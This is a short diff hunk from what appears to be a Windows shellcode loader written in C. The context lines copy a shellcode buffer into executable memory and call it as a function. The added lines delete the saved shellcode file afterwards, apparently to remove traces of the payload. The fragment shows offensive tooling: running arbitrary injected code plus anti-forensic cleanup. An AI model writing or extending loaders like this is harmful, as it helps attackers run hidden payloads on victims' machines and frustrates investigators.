@@ -132,6 +132,8 @@ int main(int argc, char* argv[]) {
 
 		memcpy(exec, shellcode, shellcode_size);
 		((void(*)())exec)();
+
+		DeleteFileW(shellcode_save_location);
 	}
 	return 0;
 }
